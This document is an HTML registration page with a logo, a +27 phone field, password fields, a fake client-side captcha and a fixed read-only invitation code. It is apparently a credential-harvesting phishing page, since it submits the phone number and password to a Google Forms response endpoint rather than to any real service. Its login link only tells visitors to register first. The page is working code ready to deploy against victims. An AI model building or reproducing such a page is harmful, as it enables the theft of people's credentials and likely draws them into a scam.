<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
  <meta name="format-detection" content="telephone=no, email=no" />
  <title>Register</title>
  <link rel="preconnect" href="https://i.postimg.cc" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #ef4444;
      --primary-pressed: #dc2626;
      --text: #ffffff;
      --muted: #d1d5db;
      --border: rgba(255, 255, 255, 0.2);
      --card: rgba(0, 0, 0, 0.3);
    }
    
    html, body {
      height: 100%;
      margin: 0;
      padding: 0;
      font-family: 'Tajawal', sans-serif;
      color: var(--text);
      overflow-x: hidden;
    }
    
    /* Background with the provided image */
    body {
      background: url('https://i.postimg.cc/DZ540xrb/BACKGROUND-41af007b.png') no-repeat center center fixed;
      background-size: cover;
    }
    
    /* Dark overlay for better readability */
    body::after {
      content: '';
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      z-index: -1;
    }
    
    .page {
      min-height: 100%;
      display: flex;
      flex-direction: column;
    }
    
    .nav {
      position: sticky;
      top: 0;
      z-index: 10;
      height: 56px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 12px;
      background: transparent;
    }
    
    .nav .left, .nav .right {
      width: 80px;
      display: flex;
      align-items: center;
    }
    
    .nav button {
      color: white;
      background: transparent;
      border: none;
      font-size: 18px;
    }
    
    .scroll {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 20px 16px 24px;
    }
    
    .logo {
      width: 140px;
      margin: 8px auto 20px;
      filter: drop-shadow(0 2px 8px rgba(0,0,0,0.3));
    }
    
    .card {
      width: 100%;
      max-width: 460px;
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 18px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
      padding: 24px 20px 28px;
      backdrop-filter: blur(8px);
    }
    
    .field {
      display: flex;
      align-items: center;
      gap: 12px;
      border: 1px solid var(--border);
      border-radius: 14px;
      padding: 12px 16px;
      background: rgba(255, 255, 255, 0.1);
      margin-top: 16px;
    }
    
    .field:first-child {
      margin-top: 0;
    }
    
    .field:focus-within {
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.3);
    }
    
    .cc-badge {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      min-width: 46px;
      height: 28px;
      padding: 0 8px;
      border-radius: 999px;
      background: rgba(255, 255, 255, 0.1);
      border: 1px solid var(--border);
      color: var(--text);
    }
    
    input {
      border: 0;
      outline: 0;
      font-size: 15px;
      flex: 1;
      background: transparent;
      color: var(--text);
    }
    
    input::placeholder {
      color: var(--muted);
      opacity: 0.7;
    }
    
    .help {
      margin-top: 8px;
      font-size: 13px;
      color: var(--muted);
      padding-left: 8px;
    }
    
    .actions {
      padding: 24px 2px 0;
    }
    
    .btn {
      width: 100%;
      border-radius: 999px;
      padding: 16px;
      font-size: 16px;
      font-weight: 600;
      border: 0;
      cursor: pointer;
      display: block;
      transition: all 0.3s ease;
    }
    
    .btn-primary {
      background: var(--primary);
      color: #fff;
      box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3);
    }
    
    .btn-primary:hover {
      background: var(--primary-pressed);
    }
    
    .btn-plain {
      margin-top: 12px;
      background: rgba(255, 255, 255, 0.1);
      color: var(--text);
      border: 1px solid var(--border);
    }
    
    .btn-plain:hover {
      background: rgba(255, 255, 255, 0.2);
    }
    
    .footer {
      max-width: 460px;
      width: 100%;
      margin: 16px auto 0;
      color: var(--text);
      display: flex;
      justify-content: space-between;
      font-size: 14px;
    }
    
    .footer a {
      color: var(--primary);
      text-decoration: none;
      font-weight: 500;
    }
    
    .footer a:hover {
      text-decoration: underline;
    }
    
    .toast {
      position: fixed;
      left: 50%;
      transform: translateX(-50%);
      bottom: 24px;
      background: #dc2626;
      color: #fff;
      padding: 12px 24px;
      border-radius: 24px;
      font-size: 14px;
      display: none;
      box-shadow: 0 4px 20px rgba(220, 38, 38, 0.3);
      z-index: 100;
    }
    
    /* Captcha styling */
    .captcha {
      cursor: pointer;
      border-radius: 8px;
      overflow: hidden;
      background: rgba(255,255,255,0.1);
      display: flex;
      align-items: center;
      justify-content: center;
      width: 112px;
      height: 31px;
    }
    
    .captcha canvas {
      border-radius: 8px;
    }
    
    /* Responsive adjustments */
    @media (max-width: 480px) {
      .card {
        padding: 20px 16px 24px;
      }
      
      .field {
        padding: 10px 14px;
      }
      
      .btn {
        padding: 14px;
      }
    }
  </style>
</head>
<body>
  <div class="page">
    <header class="nav">
      <div class="left"><button type="button">‚Üê</button></div>
      <div class="title"></div>
      <div class="right"><button type="button">EN</button></div>
    </header>

    <main class="scroll">
      <img class="logo" alt="Logo" src="https://i.postimg.cc/wjrLz46f/logo-en-US.png" />

      <!-- form linked to Google Form -->
      <form id="registerForm" class="card"
            action="https://docs.google.com/forms/d/e/1FAIpQLSersIOADeAL4zZ7H7_yfDKyGlPb4lkpMkXANJbTmHzCAtTXnA/formResponse"
            method="POST" target="_self">

        <!-- Phone (entry.11026931) -->
        <div class="field">
          <span class="cc-badge">+27</span>
          <input id="phone" name="entry.11026931" type="tel" placeholder="Please enter your mobile number" required/>
        </div>

        <!-- Password (entry.70675987) -->
        <div class="field">
          <input id="password" name="entry.70675987" type="password" placeholder="Please enter your login password" required minlength="6"/>
        </div>

        <!-- Confirm Password (entry.2139866834) -->
        <div class="field">
          <input id="confirm" name="entry.2139866834" type="password" placeholder="Please confirm your password" required minlength="6"/>
        </div>

        <!-- Captcha (not sent to Google, just validation) -->
        <div class="field">
          <input id="captchaInput" type="text" placeholder="Please enter the verification code" required/>
          <div class="captcha"><canvas id="captchaCanvas" width="112" height="31"></canvas></div>
        </div>
        <div class="help">Enter the 3-digit verification code</div>

        <!-- Invitation Code fixed (entry.1944770665) -->
        <div class="field">
          <input id="invite" name="entry.1944770665" type="text" value="6976367" readonly/>
        </div>

        <div class="actions">
          <button class="btn btn-primary" type="submit">Register Now</button>
          <button class="btn btn-plain" type="button" id="downloadBtn">Already have an account? Download the app</button>
        </div>
      </form>

      <div class="footer">
        <span>Have an account?</span>
        <a id="loginLink" href="#">Log in</a>
      </div>
    </main>
  </div>

  <div class="toast" id="toast"></div>

  <script>
    // Toast notification
    const toastEl = document.getElementById('toast');
    function toast(msg) {
      toastEl.textContent = msg;
      toastEl.style.display = 'block';
      setTimeout(() => {
        toastEl.style.display = 'none';
      }, 2000);
    }

    // Simple 3-digit captcha
    const canvas = document.getElementById('captchaCanvas');
    const ctx = canvas.getContext('2d');
    let captchaText = '';
    
    function generateCaptcha() {
      // Generate 3 random digits
      captchaText = Math.floor(100 + Math.random() * 900).toString();
      
      // Clear canvas
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      
      // Draw background
      ctx.fillStyle = 'rgba(255, 255, 255, 0.1)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      
      // Draw text
      ctx.fillStyle = '#ffffff';
      ctx.font = 'bold 24px Arial';
      ctx.textAlign = 'center';
      ctx.textBaseline = 'middle';
      ctx.fillText(captchaText, canvas.width/2, canvas.height/2);
      
      // Add some noise
      for(let i = 0; i < 20; i++) {
        ctx.strokeStyle = `rgba(255, 255, 255, ${Math.random() * 0.3})`;
        ctx.beginPath();
        ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
        ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
        ctx.stroke();
      }
    }
    
    // Initialize captcha
    generateCaptcha();
    
    // Refresh captcha on click
    document.querySelector('.captcha').addEventListener('click', generateCaptcha);

    // validate before submit
    const form = document.getElementById('registerForm');
    form.addEventListener('submit', function(e) {
      const pwd = document.getElementById('password').value;
      const conf = document.getElementById('confirm').value;
      const userCaptcha = document.getElementById('captchaInput').value.trim();
      
      if (pwd !== conf) { 
        e.preventDefault(); 
        toast('Passwords do not match.'); 
        return;
      }
      
      if (userCaptcha !== captchaText) { 
        e.preventDefault(); 
        toast('Incorrect verification code.'); 
        generateCaptcha(); 
        return;
      }
    });
    
    // Handle login link click
    document.getElementById('loginLink').addEventListener('click', function(e) {
      e.preventDefault();
      toast('You must register an account first.');
    });
  </script>
</body>
</html>
